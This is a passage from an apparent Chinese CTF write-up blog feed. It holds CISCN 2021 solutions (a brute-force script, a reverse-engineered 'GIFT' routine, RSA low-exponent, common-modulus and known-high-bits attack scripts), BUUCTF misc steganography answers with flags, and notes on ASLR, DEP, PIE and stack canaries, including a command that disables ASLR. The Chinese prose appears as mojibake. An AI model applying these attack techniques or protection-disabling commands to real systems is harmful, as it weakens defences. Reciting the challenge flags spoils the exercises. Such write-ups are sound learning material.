class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                    if <span class="keyword">i5</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="keyword">i3</span> <span class="keyword">or</span> <span class="keyword">i5</span> ==<span class="keyword">i4</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="number">1</span>:</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        a = []</span><br><span class="line">                        a.append(<span class="keyword">i1</span>)</span><br><span class="line">                        a.append(<span class="keyword">i2</span>)</span><br><span class="line">                        a.append(<span class="keyword">i3</span>)</span><br><span class="line">                        a.append(<span class="keyword">i4</span>)</span><br><span class="line">                        a.append(<span class="keyword">i5</span>)</span><br><span class="line">                        sssss.append(a)</span><br><span class="line">print(sssss)</span><br><span class="line">print(len(sssss))</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">for <span class="keyword">i1</span> in s:</span><br><span class="line">    for <span class="keyword">i2</span> in ss:</span><br><span class="line">        if <span class="keyword">i1</span>[<span class="number">2</span>] &lt;= <span class="keyword">i2</span>[<span class="number">2</span>] <span class="keyword">or</span> <span class="keyword">i1</span>[<span class="number">4</span>] &lt;= <span class="keyword">i2</span>[<span class="number">4</span>]:</span><br><span class="line">            continue</span><br><span class="line">        <span class="keyword">c</span> = <span class="number">0</span></span><br><span class="line">        for i in range(<span class="number">5</span>):</span><br><span class="line">            if <span class="keyword">i2</span>[i] == <span class="keyword">i1</span>[i]:</span><br><span class="line">                <span class="keyword">c</span> = <span class="number">1</span></span><br><span class="line">        if <span class="keyword">c</span> == <span class="number">1</span>:</span><br><span class="line">            continue</span><br><span class="line">        for <span class="keyword">i3</span> in sss:</span><br><span class="line">            <span class="keyword">c</span> = <span class="number">0</span></span><br><span class="line">            for i in range(<span class="number">5</span>):</span><br><span class="line">                if <span class="keyword">i3</span>[i] == <span class="keyword">i1</span>[i] <span class="keyword">or</span> <span class="keyword">i3</span>[i] == <span class="keyword">i2</span>[i]:</span><br><span class="line">                    <span class="keyword">c</span> = <span class="number">1</span></span><br><span class="line">            if <span class="keyword">c</span> == <span class="number">1</span>:</span><br><span class="line">                continue</span><br><span class="line">            for <span class="keyword">i4</span> in ssss:</span><br><span class="line">                <span class="keyword">c</span> = <span class="number">0</span></span><br><span class="line">                for i in range(<span class="number">5</span>):</span><br><span class="line">                    if <span class="keyword">i4</span>[i] == <span class="keyword">i1</span>[i] <span class="keyword">or</span> <span class="keyword">i4</span>[i] == <span class="keyword">i2</span>[i] <span class="keyword">or</span> <span class="keyword">i4</span>[i] == <span class="keyword">i3</span>[i]:</span><br><span class="line">                        <span class="keyword">c</span> = <span class="number">1</span></span><br><span class="line">                if <span class="keyword">c</span> == <span class="number">1</span>:</span><br><span class="line">                    continue</span><br><span class="line">                for <span class="keyword">i5</span> in sssss:</span><br><span class="line">                    if <span class="keyword">i4</span>[<span class="number">1</span>] &gt;= <span class="keyword">i5</span>[<span class="number">1</span>] <span class="keyword">or</span> <span class="keyword">i4</span>[<span class="number">4</span>] &gt;= <span class="keyword">i5</span>[<span class="number">4</span>]:</span><br><span class="line">                        continue</span><br><span class="line">                    <span class="keyword">c</span> = <span class="number">0</span></span><br><span class="line">                    for i in range(<span class="number">5</span>):</span><br><span class="line">                        if <span class="keyword">i5</span>[i] == <span class="keyword">i1</span>[i] <span class="keyword">or</span> <span class="keyword">i5</span>[i] == <span class="keyword">i2</span>[i] <span class="keyword">or</span> <span class="keyword">i5</span>[i] == <span class="keyword">i3</span>[i] <span class="keyword">or</span> <span class="keyword">i5</span>[i] == <span class="keyword">i4</span>[i]:</span><br><span class="line">                            <span class="keyword">c</span> = <span class="number">1</span></span><br><span class="line">                    if <span class="keyword">c</span> == <span class="number">1</span>:</span><br><span class="line">                        continue</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">                    print('-----------------')</span><br><span class="line">                    print(<span class="keyword">i1</span>)</span><br><span class="line">                    print(<span class="keyword">i2</span>)</span><br><span class="line">                    print(<span class="keyword">i3</span>)</span><br><span class="line">                    print(<span class="keyword">i4</span>)</span><br><span class="line">                    print(<span class="keyword">i5</span>)</span><br><span class="line">print(count)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/30/CISCN-2021-wp/image-20210515201556206.png" alt="image-20210515201556206"></p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210515201602525.png" alt="image-20210515201602525"></p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210515201614530.png" alt="image-20210515201614530"></p>
<h1 id="GIFT"><a href="#GIFT" class="headerlink" title="GIFT"></a>GIFT</h1><p>æ¯”èµ›æ—¶æ²¡åšå‡ºæ¥ï¼Œå‚è€ƒå¤§ä½¬åšå®¢å­¦ä¹ ä¸€ä¸‹ã€‚</p>
<p>ä¸ç”¨è´¹åŠ²æ¢å¤ç¬¦å·è¡¨äº†ï¼Œä½¿ç”¨IDA7.6å³å¯ï¼Œå“­äº†ã€‚</p>
<p>å…³é”®ä»£ç ï¼š</p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210525184017527.png" alt="image-20210525184017527"></p>
<p>æ€ä¹ˆåˆ¤æ–­V8å‘¢ï¼Ÿ</p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210525184205756.png" alt="image-20210525184205756"></p>
<p>å¯¹åº”çš„æ±‡ç¼–ï¼š</p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210525184500650.png" alt="image-20210525184500650"></p>
<p>è¿›å…¥main_gooooåˆ†æï¼š</p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210525184533241.png" alt="image-20210525184533241"></p>
<p>å‘ç° è¿”å›æ—¶æœ‰ä¸¤ç§æƒ…å†µï¼Œarg_18å¤„ç»™0æˆ–è€…1ï¼Œå½“ä¸Šè¾¹ä¸¤ä¸ªå€¼ä¸º0æ—¶ï¼Œä¼šè¿”å›1ã€‚ä¹Ÿå°±æ˜¯v8ä¸º1ã€‚</p>
<p>è¿™ä¸ªåœ°æ–¹åˆ†ææ˜¯ï¼Œ ï¼ˆcs:qword_2820E8+1ï¼‰% 17</p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210525184053283.png" alt="image-20210525184053283"></p>
<p>pythonè¿˜åŸå…³é”®ä»£ç ï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">tab1 = [<span class="number">0x0000000000000001</span>, <span class="number">0x0000000000000003</span>, <span class="number">0x0000000000000006</span>, <span class="number">0x0000000000000009</span>, <span class="number">0x000000000000000A</span>, <span class="number">0x000000000000000B</span>, <span class="number">0x000000000000000C</span>, <span class="number">0x000000000000000D</span>, <span class="number">0x000000000000000E</span>, <span class="number">0x000000000000000F</span>, <span class="number">0x0000000000000010</span>, <span class="number">0x0000000000000011</span>, <span class="number">0x0000000000000012</span>, <span class="number">0x0000000000000014</span>, <span class="number">0x0000000000000019</span>, <span class="number">0x000000000000001E</span>, <span class="number">0x0000000000000028</span>, <span class="number">0x0000000000000042</span>, <span class="number">0x0000000000000066</span>, <span class="number">0x00000000000000A0</span>, <span class="number">0x0000000000000936</span>, <span class="number">0x0000000000003D21</span>, <span class="number">0x00000000000149A7</span>, <span class="number">0x00000000000243AC</span>, <span class="number">0x00000000000CB5BE</span>, <span class="number">0x000000000047DC61</span>, <span class="number">0x00000000016C0F46</span>, <span class="number">0x000000000262C432</span>, <span class="number">0x0000000004ACE299</span>, <span class="number">0x0000000010FBC92A</span>, <span class="number">0x00000000329ECDFD</span>, <span class="number">0x00000000370D7470</span>]</span><br><span class="line"></span><br><span class="line">def main_goooo(data):</span><br><span class="line">    v4 = [<span class="number">0</span>] * <span class="number">5</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        v3 = data[i]</span><br><span class="line">        v4[v3] ^= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> v4[<span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> v4[<span class="number">3</span>] == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">def main_wtf(a1, a2, a3, a4):</span><br><span class="line">    global num</span><br><span class="line">    a3[a1] = a2</span><br><span class="line">    <span class="keyword">if</span> a1 == a4 - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> main_goooo(a3):</span><br><span class="line">            num = (num + <span class="number">1</span>) % <span class="number">17</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            main_wtf(a1+<span class="number">1</span>, i, a3, a4)</span><br><span class="line">def main(N):</span><br><span class="line">    global num</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    data = [<span class="number">0</span>] * N</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        main_wtf(<span class="number">0</span>, i, data, N)</span><br><span class="line">    print(num)</span><br><span class="line"># ä»<span class="number">1</span>å¼€å§‹è·‘</span><br><span class="line">#flag_i = [main(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line"># <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span></span><br><span class="line"># <span class="number">2</span> <span class="number">6</span> <span class="number">3</span> <span class="number">4</span> <span class="number">0</span> <span class="number">2</span> <span class="number">12</span> <span class="number">5</span> <span class="number">2</span> <span class="number">6</span> <span class="number">3</span> <span class="number">4</span> <span class="number">0</span></span><br><span class="line"># å‘ç°<span class="number">8</span>ä¸ªä¸€ç»„</span><br><span class="line">ss = [<span class="number">2</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>]</span><br><span class="line">ss_result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    idx = tab1[i]</span><br><span class="line">    ss_result.append(ss[((idx<span class="number">-1</span>) % <span class="number">8</span>)])</span><br><span class="line">print(ss_result)</span><br><span class="line">s1 = [<span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0x52</span>, <span class="number">0x04</span>, <span class="number">0x55</span>, <span class="number">0x05</span>, <span class="number">0x53</span>, <span class="number">0x5f</span>, <span class="number">0x50</span>, <span class="number">0x07</span>, <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x51</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x57</span>]</span><br><span class="line">result2 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    result2 += chr(s1[ss_result[i]] ^ <span class="number">0x66</span>)</span><br><span class="line">print(result2)</span><br></pre></td></tr></table></figure>

<p>å¤§ä½¬ä»¬éƒ½å‘ç°äº†è¿ç®—è§„å¾‹ï¼Œæˆ‘å±å®è„‘å­ä¸å¤Ÿç”¨ï¼Œä½†æ˜¯å‘ç°äº†8ä¸ªä¸ºä¸€ç»„çš„è§„å¾‹ã€‚</p>
<p>CISCN{4b445b3247c45344c54c44734445452c}</p>
<h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä½è§£å¯†æŒ‡æ•°æ”»å‡»</span></span><br><span class="line">c1 = 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span><br><span class="line">e1 = 3</span><br><span class="line">N1 = 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span><br><span class="line">i = 0</span><br><span class="line">while 1:</span><br><span class="line">    if gmpy2.iroot(c1+i*N1, 3)[1] == 1:</span><br><span class="line">        print(hex(gmpy2.iroot(c1+i*N1, 3)[0]))</span><br><span class="line">        break</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">c21 = 54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><br><span class="line">c22 = 91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><br><span class="line">e21 = 17</span><br><span class="line">e22 = 65537</span><br><span class="line">N2 = 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span><br><span class="line"></span><br><span class="line"><span class="comment">#å…±æ¨¡æ”»å‡»</span></span><br><span class="line">def gongmogongji(n, c1, c2, e1, e2):</span><br><span class="line">    def egcd(a, b):</span><br><span class="line">        if b == 0:</span><br><span class="line">            return a, 0</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x, y = egcd(b, a % b)</span><br><span class="line">            return y, x - (a // b) * y</span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    s1 = s[0]</span><br><span class="line">    s2 = s[1]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ±‚æ¨¡åå…ƒç´ </span></span><br><span class="line">    if s1 &lt; 0:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    elif s2 &lt; 0:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line">    return m</span><br><span class="line">print(hex(gongmogongji(N2, c21, c22, e21, e22)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#å·²çŸ¥pé«˜ä½</span></span><br><span class="line">c3 = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span><br><span class="line">e3 = 65537</span><br><span class="line">N3 = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span><br><span class="line"></span><br><span class="line">'''</span><br><span class="line">n=113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span><br><span class="line">p=7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span><br><span class="line"></span><br><span class="line">pbits = 512</span><br><span class="line">kbits = pbits-p.nbits()</span><br><span class="line">p=p&lt;&lt;kbits</span><br><span class="line">print(<span class="string">"upper %d bits (of %d bits) is given"</span> % (pbits-kbits, pbits))</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p</span><br><span class="line">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">print(p+int(x0))</span><br><span class="line">'''</span><br><span class="line">p = 11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span><br><span class="line">q = N3 // p</span><br><span class="line">n = (p-1) * (q-1)</span><br><span class="line">d = gmpy2.invert(e3, n)</span><br><span class="line">m = pow(c3,d,N3)</span><br><span class="line">print(hex(m))</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/30/CISCN-2021-wp/image-20210516020425188.png" alt="image-20210516020425188"></p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210516020227872.png" alt="image-20210516020227872"></p>
<p>CISCN{3943e8843a19149497956901e5d98639}</p>
]]></content>
      <categories>
        <category>CTFèµ›é¢˜writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-misc-1</title>
    <url>/2021/05/30/buuctf-misc-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"><a href="#å¦å¤–ä¸€ä¸ªä¸–ç•Œ" class="headerlink" title="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"></a>å¦å¤–ä¸€ä¸ªä¸–ç•Œ</h1><p>å›¾ç‰‡æœ€åæœ‰ä¸€ä¸²2è¿›åˆ¶å­—ç¬¦ä¸²ã€‚</p>
<p><a href="https://s1lenc3-chenmo.github.io/2021/05/17/buuctf-misc-1/image-20210517171713381.png" target="_blank" rel="noopener"><img src="/2021/05/30/buuctf-misc-1/image-20210517171713381.png" alt="image-20210517171713381"></a></p>
<p>flag{koekj3s}</p>
<h1 id="éšè—çš„é’¥åŒ™"><a href="#éšè—çš„é’¥åŒ™" class="headerlink" title="éšè—çš„é’¥åŒ™"></a>éšè—çš„é’¥åŒ™</h1><p><img src="/2021/05/30/buuctf-misc-1/image-20210517172050595.png" alt="image-20210517172050595"></p>
<p>base64è§£ç ï¼š</p>
<p>flag{377cbadda1eca2f2f73d36277781f00a}</p>
<h1 id="å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜"><a href="#å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜" class="headerlink" title="å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜"></a>å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜</h1><p>å¾—åˆ°ç›²æ–‡ï¼Œ</p>
<p>kmdonowg</p>
<p>è§£å‹å¾—åˆ°éŸ³é¢‘ï¼Œå‘ç°è«æ–¯å¯†ç ã€‚</p>
<p>-.-. - ..-. .â€“ .â€“. . .. â€”â€“ â€”.. â€“â€¦ â€¦â€“ ..â€” ..â€“.. ..â€” â€¦â€“ -.. â€“..</p>
<p>è§£å¯†å¾—åˆ°flagï¼šflag{wpei08732?23dz}</p>
<h1 id="ç¥ç§˜é¾™å·é£"><a href="#ç¥ç§˜é¾™å·é£" class="headerlink" title="ç¥ç§˜é¾™å·é£"></a>ç¥ç§˜é¾™å·é£</h1><p>çˆ†ç ´ï¼Œ</p>
<p><img src="/2021/05/30/buuctf-misc-1/image-20210517173925348.png" alt="image-20210517173925348"></p>
<p>brainfuckè§£å¯†ã€‚</p>
<p>flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p>
<h1 id="ç¬¬å››æ‰©å±•FS"><a href="#ç¬¬å››æ‰©å±•FS" class="headerlink" title="ç¬¬å››æ‰©å±•FS"></a>ç¬¬å››æ‰©å±•FS</h1><p>foremoståˆ†ç¦»å‡ºå‹ç¼©åŒ…ï¼Œæ–‡ä»¶å±æ€§ä¸­å¤‡æ³¨æœ‰å¯†ç ï¼Œç„¶åè¯é¢‘åˆ†æã€‚</p>
<p><img src="/2021/05/30/buuctf-misc-1/image-20210517180546789.png" alt="image-20210517180546789"></p>
<p>flag{huanwe1sik4o!}</p>
<h1 id="shredder"><a href="#shredder" class="headerlink" title="shredder"></a>shredder</h1><h1 id="Sudoku"><a href="#Sudoku" class="headerlink" title="Sudoku"></a>Sudoku</h1><h1 id="42-tar-xz"><a href="#42-tar-xz" class="headerlink" title="42.tar.xz"></a>42.tar.xz</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> [ <span class="string">"`find . -type f -name '*.tar.xz' | wc -l`"</span> -gt 0 ]; <span class="keyword">do</span> find -<span class="built_in">type</span> f -name <span class="string">"*.tar.xz"</span> -<span class="built_in">exec</span> tar xf <span class="string">'&#123;&#125;'</span> \; -<span class="built_in">exec</span> rm -- <span class="string">'&#123;&#125;'</span> \;; <span class="keyword">done</span>;</span><br><span class="line">find . -<span class="built_in">type</span> f -name <span class="string">'*.tar.xz'</span> | wc -l` <span class="comment">#æ‰¾åˆ°.tar.xzç»“å°¾çš„æ‰€æœ‰æ–‡ä»¶,å¹¶ç»Ÿè®¡æ˜¾ç¤ºæ–‡ä»¶ä¸ªæ•°</span></span><br><span class="line"><span class="keyword">while</span> å¾ªç¯ï¼Œ&gt;=0 éå†æ–‡ä»¶</span><br><span class="line">åœ¨shellè„šæœ¬é‡Œ</span><br><span class="line">æ‰§è¡ŒæŸ¥æ‰¾è§£å‹åˆ é™¤åŸå‹ç¼©æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>flag{04ebb0d6a87f9771f2eea4dce5b91a85e7623c13301a8007914085a91b3ca6d9}</p>
<h1 id="åé—¨æŸ¥æ€"><a href="#åé—¨æŸ¥æ€" class="headerlink" title="åé—¨æŸ¥æ€"></a>åé—¨æŸ¥æ€</h1><p><img src="/2021/05/30/buuctf-misc-1/image-20210518172104471.png" alt="image-20210518172104471"></p>
<p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p>
<h1 id="è·å…°å®½å¸¦æ•°æ®æ³„éœ²"><a href="#è·å…°å®½å¸¦æ•°æ®æ³„éœ²" class="headerlink" title="è·å…°å®½å¸¦æ•°æ®æ³„éœ²"></a>è·å…°å®½å¸¦æ•°æ®æ³„éœ²</h1><p>è·¯ç”±å™¨æ•°æ®ï¼Œä½¿ç”¨RouterPassViewæ‰“å¼€</p>
<p>ç”¨æˆ·åä¸ºflagã€‚</p>
<p><img src="/2021/05/30/buuctf-misc-1/image-20210518172835613.png" alt="image-20210518172835613"></p>
<p>flag{053700357621}</p>
<h1 id="æ¥é¦–æ­Œå§"><a href="#æ¥é¦–æ­Œå§" class="headerlink" title="æ¥é¦–æ­Œå§"></a>æ¥é¦–æ­Œå§</h1><p><img src="/2021/05/30/buuctf-misc-1/image-20210518173232085.png" alt="image-20210518173232085"></p>
<p>æ‘©æ–¯å¯†ç </p>
<p>flag{5BC925649CB0188F52E617D70929191C}</p>
<h1 id="æ•°æ®åŒ…ä¸­çš„çº¿ç´¢"><a href="#æ•°æ®åŒ…ä¸­çš„çº¿ç´¢" class="headerlink" title="æ•°æ®åŒ…ä¸­çš„çº¿ç´¢"></a>æ•°æ®åŒ…ä¸­çš„çº¿ç´¢</h1><p>ç­›é€‰HTTPæµï¼Œå¾—åˆ°base64ç¼–ç ï¼Œè¿›è¡Œè§£ç ï¼Œå¾—åˆ°jpgæ–‡ä»¶ï¼Œæ‰“å¼€æ˜¾ç¤ºflagã€‚</p>
<p>flag{209acebf6324a09671abc31c869de72c}</p>
<h1 id="ä¹è¿ç¯"><a href="#ä¹è¿ç¯" class="headerlink" title="ä¹è¿ç¯"></a>ä¹è¿ç¯</h1><p>ä¼ªåŠ å¯†ï¼Œ</p>
<p><img src="/2021/05/30/buuctf-misc-1/image-20210518180812630.png" alt="image-20210518180812630"></p>
<p>å¾—åˆ°ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…å¯†ç åº”è¯¥åœ¨å›¾ç‰‡ä¸­ã€‚</p>
<p>ä½¿ç”¨steghide extract -sf good.jpg å¾—åˆ°txtæ–‡ä»¶ã€‚</p>
<p>å‹ç¼©åŒ…å¯†ç ä¸ºbV1g6t5wZDJif^J7</p>
<p>flag{1RTo8w@&amp;4nK@z*XL}</p>
]]></content>
      <categories>
        <category>CTFèµ›é¢˜writeup</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>äºŒè¿›åˆ¶ç¨‹åºçš„ä¿æŠ¤æªæ–½</title>
    <url>/2020/04/11/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>å‚è€ƒå¤§ä½¬åšå®¢ï¼š<a href="http://blog.eonew.cn/archives/222" target="_blank" rel="noopener">http://blog.eonew.cn/archives/222</a></p>
<h1 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h1><p>ASLRï¼ˆåœ°å€éšæœºåŒ–ï¼‰æ˜¯ä¸€ç§é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œé€šè¿‡å¯¹å †ã€æ ˆã€å…±äº«åº“æ˜ å°„ç­‰çº¿æ€§åŒºå¸ƒå±€çš„éšæœºåŒ–ï¼Œé€šè¿‡å¢åŠ æ”»å‡»è€…é¢„æµ‹ç›®çš„åœ°å€çš„éš¾åº¦ï¼Œé˜²æ­¢æ”»å‡»è€…ç›´æ¥å®šä½æ”»å‡»ä»£ç ä½ç½®ï¼Œè¾¾åˆ°é˜»æ­¢æº¢å‡ºæ”»å‡»çš„ç›®çš„ã€‚<br>ä½†æ˜¯ï¼Œåœ°å€éšæœºåŒ–ä¸æ˜¯å¯¹æ‰€æœ‰æ¨¡å—å’Œå†…å­˜åŒºéƒ½è¿›è¡ŒéšæœºåŒ–ï¼è™½ç„¶libcã€æ ˆã€å †çš„åŠ è½½ä½ç½®è¢«éšæœºåŒ–ï¼Œä½†ä¸»é•œåƒä¸ä¼šã€‚</p>
<p>Linuxæ£€æŸ¥æ˜¯å¦å¼€å¯ASLRï¼Œå‘½ä»¤ï¼š</p>
<p><code>cat /proc/sys/kernel/randomize_va_space</code></p>
<p>å¦‚æœ/proc/sys/kernel/randomize_va_spaceé‡Œçš„å€¼ä¸º0æ—¶ï¼Œåˆ™è¡¨ç¤ºASLRå…³é—­ã€‚</p>
<p>å¯ç”¨ä¸‹é¢çš„å‘½ä»¤æ‰‹åŠ¨å…³é—­ï¼š</p>
<p><code>echo -n &quot;0&quot; &gt; /proc/sys/kernel/randomize_va_space</code>      -nè¡¨ç¤ºä¸è¾“å‡ºæ¢è¡Œ</p>
<p>Windows10å¼ºåˆ¶å¼€å¯ALSRï¼Œå¯ä»¥é€šè¿‡æ›´æ”¹PEæ–‡ä»¶å¤´é‡Œçš„Optional Headerç»“æ„ä½“é‡Œçš„DLL Characteristicså­—æ®µï¼Œå°†DLL Characteristicså­—æ®µçš„ç¬¬7ä½è®¾ç½®ä¸º0å³å¯å…³é—­æ ˆçš„ASLRï¼Œä½†æ˜¯ç³»ç»ŸåŠ¨æ€åº“çš„ALSRæ˜¯å¼ºåˆ¶å¼€å¯çš„ã€‚</p>
<h1 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h1><p>æ•°æ®æ‰§è¡Œä¿æŠ¤ï¼Œé»˜è®¤æ ˆçš„æƒé™æ˜¯å¯è¯»ã€å¯å†™ã€ä¸å¯æ‰§è¡Œã€‚</p>
<p>gccç¼–è¯‘æ—¶é€šè¿‡å‚æ•°<code>-z execstack</code>å…³é—­è¯¥ä¿æŠ¤ï¼Œ<code>-z noexecstack</code>å¼€å¯è¯¥ä¿æŠ¤ã€‚ï¼ˆ-z ä¼ å‚é“¾æ¥å™¨ï¼‰</p>
<h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>PIE(position-independent executable, åœ°å€æ— å…³å¯æ‰§è¡Œæ–‡ä»¶)æŠ€æœ¯å°±æ˜¯ä¸€ä¸ªé’ˆå¯¹ä»£ç æ®µ.text, æ•°æ®æ®µ.*dataï¼Œ.bssç­‰å›ºå®šåœ°å€çš„ä¸€ä¸ªé˜²æŠ¤æŠ€æœ¯ã€‚åŒASLRä¸€æ ·ï¼Œåº”ç”¨äº†PIEçš„ç¨‹åºä¼šåœ¨æ¯æ¬¡åŠ è½½æ—¶éƒ½å˜æ¢åŠ è½½åŸºå€ã€‚</p>
<p>gccç¼–è¯‘æ—¶å‚æ•°<code>-fpie -pie</code>å¼€å¯PIEï¼Œ-<code>no-pie</code>å…³é—­PIEã€‚</p>
<h1 id="Stack-Guard"><a href="#Stack-Guard" class="headerlink" title="Stack Guard"></a>Stack Guard</h1><p>ç¼–è¯‘å™¨å¯¹æ ˆæº¢å‡ºçš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ï¼Œåœ¨å‡½æ•°æ‰§è¡Œæ—¶ï¼Œå…ˆåœ¨æ ˆä¸Šæ”¾ç½®ä¸€ä¸ªéšæœºæ ‡è¯†ç¬¦ï¼Œå‡½æ•°è¿”å›å‰ä¼šå…ˆæ£€æŸ¥æ ‡è¯†ç¬¦æ˜¯å¦è¢«ä¿®æ”¹ï¼Œå¦‚æœè¢«ä¿®æ”¹åˆ™ç›´æ¥è§¦å‘ä¸­æ–­æ¥ä¸­æ­¢ç¨‹åºï¼Œå¯ä»¥æœ‰æ•ˆçš„é˜²æ­¢æ ˆæº¢å‡ºæ”»å‡»ã€‚</p>
